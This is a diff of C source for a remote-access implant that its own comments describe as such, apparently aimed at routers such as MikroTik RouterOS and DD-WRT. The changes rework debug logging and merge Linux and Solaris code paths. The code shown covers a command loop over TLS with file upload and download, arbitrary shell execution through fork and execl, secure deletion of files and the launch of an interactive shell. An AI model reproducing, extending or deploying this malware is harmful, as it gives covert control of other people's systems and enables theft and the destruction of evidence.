@@ -147,7 +147,7 @@ int UploadFile(char* path, unsigned long size, int sock)
 	{
 		return errno;
 	}
-	D( printf( " DEBUG: opened path: %s\n", path ); )
+	DLX(2, printf("Opened path: %s\n", path));
 
 	// Set successful reply
 	ret.reply = 0;
@@ -163,7 +163,7 @@ int UploadFile(char* path, unsigned long size, int sock)
 		goto Error;
 	}
 
-	D( printf( " DEBUG: Acknowledged UploadFile command of size %d\n", (int)size ); )
+	DLX(2, printf("Acknowledged UploadFile command of size %d\n", (int)size));
 	
 	while (size)
 	{
@@ -222,7 +222,7 @@ int DownloadFile(char *path, unsigned long size, int sock)
 
 	if ( fd == 0 )
 	{
-		D( perror( "fopen()"); )
+		DLX(1, perror("fopen(): "));
 		return errno;
 	}
 
@@ -231,7 +231,7 @@ int DownloadFile(char *path, unsigned long size, int sock)
 //	if( stat( path, &buf ) != 0 )
 	if( _fstat( fileno( fd ), &buf ) != 0 )
 	{
-		D( perror( "fstat()"); )
+		DLX(1, perror("fstat(): "));
 		goto Error;
 	}
 
@@ -242,12 +242,9 @@ int DownloadFile(char *path, unsigned long size, int sock)
 		size = hstat( fileno( fd ) );
 	}
 
-	D( printf( " DEBUG: total fstat() size: %i\n", (int)buf.st_size ); )
-	D( printf( " DEBUG: total size: %i\n", (int)size ); )
-    //Commented this section out on 8 May 2012, not sure why it was necessary.
-	//D( printf( " DEBUG: blocksize for I/O: %i\n", (int)buf.st_blksize ); )
-	//D( printf( " DEBUG: number of blks alloc: %i\n", (int)buf.st_blocks ); )
-	D( printf( " DEBUG: remote file size is %ld\n", size ); )
+	DLX(2, printf("Total fstat() size: %i\n", (int)buf.st_size));
+	DLX(2, printf("Total size: %i\n", (int)size));
+	DLX(2, printf("Remote file size is %ld\n", size));
 
 	// Setup reply struct
 	ret.reply = 0;
@@ -258,7 +255,7 @@ int DownloadFile(char *path, unsigned long size, int sock)
 //	if(SOCKET_ERROR == send(sock, (const char*) &ret, sizeof(REPLY), 0))
 	if ( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(REPLY) ) )
 	{
-		D( printf( " ERROR: Socket ERROR\n" ); )
+		DLX(2, printf("crypt_write() socket error\n"));
 		goto Error;
 	}
 
@@ -281,6 +278,7 @@ int DownloadFile(char *path, unsigned long size, int sock)
 //		if(SOCKET_ERROR == send(sock,(const char*)(unsigned char*) &data,sizeof(DATA), 0))
 		if ( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&data, sizeof(DATA) ) )
 		{
+			DLX(3, printf("crypt_write() socket error\n"));
 			goto Error;
 		}
 	}
@@ -316,14 +314,14 @@ int hstat( int fd )
 	// offset == file size
 	if ( ( fsize = lseek( fd, 0, SEEK_END ) ) < 0 )
 	{
-		D( perror( "lseek(): SEEK_END"); )
+		DLX(4, perror("lseek(): SEEK_END: "));
 		return -1;
 	}
 
 	// reset offset back to beginning of the file
 	if ( lseek( fd, 0, SEEK_SET ) < 0 )
 	{
-		D( perror( "lseek(): SEEK_SET"); )
+		DLX(4, perror("lseek(): SEEK_SET: "));
 		return -1;
 	}
 
@@ -412,7 +410,7 @@ int SecureDelete( char *path )
 		// Given prior successful testing with the MikroTik RouterOS on 
 		// other hardware, remove() is expected to work.....
 		// With DD-WRT, remove() fails with "can't resolve symbol 'remove'"
-		D( perror( "remove()" ); )
+		DLX(2, perror("remove(): "));
 		goto Error;
 	}
 #endif
@@ -425,38 +423,32 @@ Error:
 }
 
 
-//******************************************************************
-//************** Platform specific functions ***********************
-//******************************************************************
-
-#if defined LINUX
-
 unsigned long StartClientSession( int sock )
 {
 	int fQuit = 0;
 	int retval = 0;
 	char* commandpath = 0;
 
-	D( printf( "%s:%i\n", __FILE__, __LINE__ ); );
+	DL(2);
 	// we have an established TCP/IP connection
 	// although we consider this the SERVER, for the SSL/TLS transaction, 
 	// the implant acts as a SSL client
 	if ( crypt_setup_client( &trig_hs, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
 	{
-		D( printf( "%s:%i: ERROR: crypt_setup_client()\n", __FILE__, __LINE__ ); );
+		DLX(2, printf("ERROR: crypt_setup_client()\n"));
 			crypt_cleanup( &trig_ssl);
 		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
 	}
 
 	// start TLS handshake
-	D( printf( "%s:%i\n", __FILE__, __LINE__ ); );
+	DL(3);
 	if ( crypt_handshake(&trig_ssl) != SUCCESS )
 	{
-		D( printf( "%s:%i ERROR: TLS connection with TLS server failed to initialize.\n", __FILE__, __LINE__ ); );
+		DLX(2, printf("ERROR: TLS connection with TLS server failed to initialize.\n"));
 			crypt_cleanup( &trig_ssl);
 		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
 	}
-	D( printf( "%s:%i TLS handshake complete.\n", __FILE__, __LINE__ ); );
+	DLX(3, printf("TLS handshake complete.\n"));
 
 
 		while(!fQuit)
@@ -471,17 +463,14 @@ unsigned long StartClientSession( int sock )
 
 			// set timeout.  if we don't receive a command within this timeframe, assume we are hung and exit
 			// this timeout is reset each time a command is received.
-#ifdef LINUX
 			alarm( SESSION_TIMEOUT );
-#endif
+
 			//		Receive(sock, (unsigned char*)&cmd, sizeof(cmd), CMD_TIMEOUT);
 			//TODO: Fix this. There's nothing in this loop after removing the WIN32 code.
 			if( 0 > crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ) ) )
 			{
 			}
-#ifdef LINUX
 			alarm( 0 );
-#endif
 
 			// Expand the cmd.path to the proper path resolving ENVIRONMENT variables
 			if( commandpath != 0 ) 
@@ -491,69 +480,71 @@ unsigned long StartClientSession( int sock )
 			}
 			ExpandEnvStrings(cmd.path, &commandpath);
 
-			D (printf ("%s, %4d:\tExecuting command: 0x%0x\n", __FILE__, __LINE__, cmd.command); )
+			DLX(2, printf ("\tExecuting command: 0x%0x\n", cmd.command));
 
 			//act on command, THESE FOLLOWING VALUES ARE DEFINED IN THE Shell.h file.
 			switch(cmd.command)
 			{
 				case EXIT:
-					D( printf( " DEBUG: EXIT command received.\n" ); )
+					DLX(2, printf("EXIT command received.\n"));
 						fQuit = 1;
 					ret.reply = 0;
 					break;
 
 				case UPLOAD:
-					D( printf( " DEBUG: UPLOAD command received.\n" ); )
+					DLX(2, printf("UPLOAD command received.\n"));
 						ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
 					break;
 
 				case DOWNLOAD:
-					D( printf( " DEBUG: DOWNLOAD command received.\n" ); )
+					DLX(2, printf("DOWNLOAD command received.\n"));
 						ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
 					break;
 
 				case EXECUTE:
-					D( printf( " DEBUG: EXECUTE command received.\n" ); )
+					DLX(2, printf("EXECUTE command received.\n"));
 						memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
 					ret.reply = Execute( commandpath );
 					break;
 
 
 				case DELETE:
-					D( printf( " DEBUG: DELETE command received, attempting SECUREDELETE...\n" ); )
+					DLX(2, printf("DELETE command received, attempting SECURE DELETE...\n"));
 						ret.reply = SecureDelete(commandpath);
 
 					//If SecureDelete failed, ret.reply is not 0 so try to use DelFile function
 					if (ret.reply != 0)
 					{
-						D( printf( " DEBUG: now attempting to UNLINK the file\n" ); )
+						DLX(2, printf("Now attempting to UNLINK the file: %s\n", commandpath));
 							ret.reply = DelFile(commandpath);
 					}
 					break;
-
+//TODO: The following code (from here through the exit) needs to be reviewed.
 				case SHUTDOWNBOTH:
-					D( printf( " DEBUG: SHUTDOWN command received.\n" ); )
-						fQuit = 1;
+					DLX(2, printf("SHUTDOWN command received.\n"));
+					fQuit = 1;
 					ret.reply = 0;
 					crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) );
 					//			send(sock, (const char*)&ret, sizeof(ret),0);
 					closesocket(sock);
 					sock = INVALID_SOCKET;
 					retval = SHUTDOWN;
+					//TODO: Linux used "break", Solaris used "goto Exit". Investigate this further.
+#ifdef LINUX
 					break;
+#else
+					goto Exit;
+#endif
 
 				case LAUNCHTRUESHELL:
-					D( printf( " DEBUG: LAUNCHTRUESHELL command received.\n" ); )
+					DLX(2, printf("LAUNCHTRUESHELL command received.\n"));
 					ret.reply = launchShell(commandpath);
 					D( printf( " DEBUG: launchshell() returned %i\n", (int)ret.reply ); )
 					break;
 
-					// not reached ???
-					goto Exit;
-
 				default:
-					D( printf( " DEBUG: command not recognized.\n" ); )
-						fQuit = 1;
+					DLX(2, printf("Command not recognized.\n"));
+					fQuit = 1;
 					break;
 
 			}
@@ -574,14 +565,8 @@ Exit:
 		if( commandpath != 0 ) free( commandpath );
 		crypt_cleanup( &trig_ssl);
 
-		//_CrtDumpMemoryLeaks();//IAN DELETE LATER IAN COMMENT OR DELETE
-
 		return retval;
 }
-
-#endif
-
-#ifdef LINUX
 
 int Execute( char *path )
 {
@@ -590,14 +575,20 @@ int Execute( char *path )
 	int status=0; 
 	pid_t pid;
 	char* receivedCommand;
-#ifdef _USE_ASH
-// and actually, on the MT, /bin/bash is a symbolic link to /bin/ash which is part of /bin/busybox
-	char* shell="/bin/ash";
-#elif _USE_BASH
-	char* shell="/bin/bash";
+
+#ifdef LINUX
+	#ifdef _USE_ASH
+	// and actually, on the MT, /bin/bash is a symbolic link to /bin/ash which is part of /bin/busybox
+		char* shell="/bin/ash";
+	#elif _USE_BASH
+		char* shell="/bin/bash";
+	#else
+		char* shell="/bin/sh";
+	#endif
 #else
 	char* shell="/bin/sh";
 #endif
+
 	receivedCommand = path;
 
 	pid = fork();
@@ -616,220 +607,27 @@ int Execute( char *path )
 	{
 		//This is the parent process, Wait for the child to complete.
 		rv = waitpid( pid, &status, 0);
-		D( printf("\n waitpid returned %d while waiting for pid of %d\n", rv, pid); )
+		DLX(2, printf("waitpid() returned %d while waiting for pid %d\n", rv, (int)pid));
 		if (WIFEXITED(status))
 		{
-			D( printf("\n WIFEXITED = true so child terminated normally.\n"); )
-			D( printf("\n WEXITSTATUS(status) = %d\n",WEXITSTATUS(status)); )
+			DLX(2, printf("Child terminated normally with exit status: %d\n", WEXITSTATUS(status) ));
 		}
 		if (WIFSIGNALED(status))
 		{
-			D( printf("\n WIFSIGNALED = true so child was terminated by a signal.\n"); )
-			D( printf("\n Child SIGNAL = %d\n", WTERMSIG(status)); )
+			DLX(2, printf("Child was terminated by signal: %d\n", WTERMSIG(status) ));
 		}
 
 	}
 
-	D( printf("\n\n----------\n Debug printout of received Command=%s, status=%i\n----------\n\n", receivedCommand, status); )
+	DLX(2, printf("Received Command: %s, Status: %i", receivedCommand, status));
 	return(status);
 }
     
 int ExpandEnvStrings( char* path, char** newpath)
 {
+	//TODO: Validate on Solaris
 	int retval = 0;
 	*newpath = (char*) malloc( sizeof( ((COMMAND*)0)->path) ); 
 	memcpy( *newpath, path, sizeof( ((COMMAND*)0)->path)); 
 	return retval;
 }
-
-#elif defined SOLARIS
-
-unsigned long StartClientSession( int sock )
-{
-	int fQuit = 0;
-	int retval = 0;
-	char* commandpath = 0;
-
-	// we have an established TCP/IP connection
-	// although we consider this the SERVER, for the SSL/TLS transaction, 
-	// the implant acts as a SSL client
-	if ( crypt_setup_client( &trig_hs, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
-	{
-		D( printf( " ERROR: crypt_setup_client()\n" ); )
-			crypt_cleanup( &trig_ssl);
-		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
-	}
-
-	// start TLS handshake
-	if ( crypt_handshake(&trig_ssl) != SUCCESS )
-	{
-		D( printf( " ERROR: TLS connection with TLS server failed to initialize.\n" ); )
-			crypt_cleanup( &trig_ssl);
-		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
-	}
-	D( printf( " DEBUG: TLS handshake complete.\n" ); )
-
-
-		while(!fQuit)
-		{
-			COMMAND cmd;
-			REPLY ret;
-
-			// Fill reply buffer with random bytes
-			GenRandomBytes((unsigned char *)&ret, sizeof(REPLY));
-
-			// Get command struct. Willing to wait 5 minutes between commands
-
-			// set timeout.  if we don't receive a command within this timeframe, assume we are hung and exit
-			// this timeout is reset each time a command is received.
-			alarm( SESSION_TIMEOUT );
-			//		Receive(sock, (unsigned char*)&cmd, sizeof(cmd), CMD_TIMEOUT);
-			crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ) );
-			alarm( 0 );
-
-			// Expand the cmd.path to the proper path resolving ENVIRONMENT variables
-			if( commandpath != 0 ) 
-			{
-				free( commandpath );
-				commandpath = 0;
-			}
-			ExpandEnvStrings(cmd.path, &commandpath);
-
-			D( printf( " DEBUG: about to enter case statement to parse command.\n" ); )
-
-				//act on command, THESE FOLLOWING VALUES ARE DEFINED IN THE Shell.h file.
-				switch(cmd.command)
-			{
-				case EXIT:
-					D( printf( " DEBUG: EXIT command received.\n" ); )
-						fQuit = 1;
-					ret.reply = 0;
-					break;
-
-				case UPLOAD:
-					D( printf( " DEBUG: UPLOAD command received.\n" ); )
-						ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
-					break;
-
-				case DOWNLOAD:
-					D( printf( " DEBUG: DOWNLOAD command received.\n" ); )
-						ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
-					break;
-
-				case EXECUTE:
-					D( printf( " DEBUG: EXECUTE command received.\n" ); )
-						memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
-					ret.reply = Execute( commandpath );
-					break;
-
-
-				case DELETE:
-					D( printf( " DEBUG: DELETE command received, attempting SECUREDELETE...\n" ); )
-						ret.reply = SecureDelete(commandpath);
-
-					//If SecureDelete failed, ret.reply is not 0 so try to use DelFile function
-					if (ret.reply != 0)
-					{
-						D( printf( " DEBUG: now attempting to UNLINK the file\n" ); )
-							ret.reply = DelFile(commandpath);
-					}
-					break;
-
-				case SHUTDOWNBOTH:
-					D( printf( " DEBUG: SHUTDOWN command received.\n" ); )
-						fQuit = 1;
-					ret.reply = 0;
-					crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) );
-					//			send(sock, (const char*)&ret, sizeof(ret),0);
-					closesocket(sock);
-					sock = INVALID_SOCKET;
-					retval = SHUTDOWN;
-					goto Exit;
-
-				case LAUNCHTRUESHELL:
-					D( printf( " DEBUG: LAUNCHTRUESHELL command received.\n" ); )
-					ret.reply = launchShell(commandpath);
-					D( printf( " DEBUG: launchshell() returned %i\n", (int)ret.reply ); )
-					break;
-
-				default:
-					D( printf( " DEBUG: command not recognized.\n" ); )
-						fQuit = 1;
-					break;
-
-			}
-
-			// Send reply
-			//		if( SOCKET_ERROR == send(sock, (const char*)&ret, sizeof(ret),0))
-			if( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) ) )
-			{
-				closesocket(sock);
-				goto Exit;
-			}
-		}
-
-		// TODO: Instead of allowing this function to return to connectShell and then trigger_exec where then
-		// retval == SHUTDOWN is processed, why not process it here?  it might eliminate some tracing
-		// back and forth.
-Exit:
-		if( commandpath != 0 ) free( commandpath );
-		crypt_cleanup( &trig_ssl);
-
-		//_CrtDumpMemoryLeaks();//IAN DELETE LATER IAN COMMENT OR DELETE
-
-		return retval;
-}
-
-int Execute( char *path )
-{
-	//Assume success...
-	int rv;
-	int status=0; 
-	pid_t pid;
-	char* receivedCommand;
-	char* shell="/bin/sh";
-	receivedCommand = path;
-
-	pid = fork();
-	if (pid == 0)
-	{
-		//This is the child so execute the command...
-		execl( shell, shell, "-c", receivedCommand, NULL);
-		exit(EXIT_FAILURE);
-	}
-	else if (pid < 0)
-	{
-		//The fork failed, report the error;
-		status = -1;
-	}
-	else
-	{
-		//This is the parent process, Wait for the child to complete.
-		rv = waitpid( pid, &status, 0);
-		D( printf("\n waitpid returned %d while waiting for pid of %d\n", rv, (int)pid); )
-		if (WIFEXITED(status))
-		{
-			D( printf("\n WIFEXITED = true so child terminated normally.\n"); )
-			D( printf("\n WEXITSTATUS(status) = %d\n",WEXITSTATUS(status)); )
-		}
-		if (WIFSIGNALED(status))
-		{
-			D( printf("\n WIFSIGNALED = true so child was terminated by a signal.\n"); )
-			D( printf("\n Child SIGNAL = %d\n", WTERMSIG(status)); )
-		}
-
-	}
-
-	D( printf("\n\n----------\n Debug printout of received Command=%s, status=%i\n----------\n\n", receivedCommand, status); )
-	return(status);
-}
-
-int ExpandEnvStrings( char* path, char** newpath)
-{
-	// TODO: validate
-	int retval = 0;
-	*newpath = (char*) malloc( sizeof( ((COMMAND*)0)->path) ); 
-	memcpy( *newpath, path, sizeof( ((COMMAND*)0)->path)); 
-	return retval;
-}
-#endif
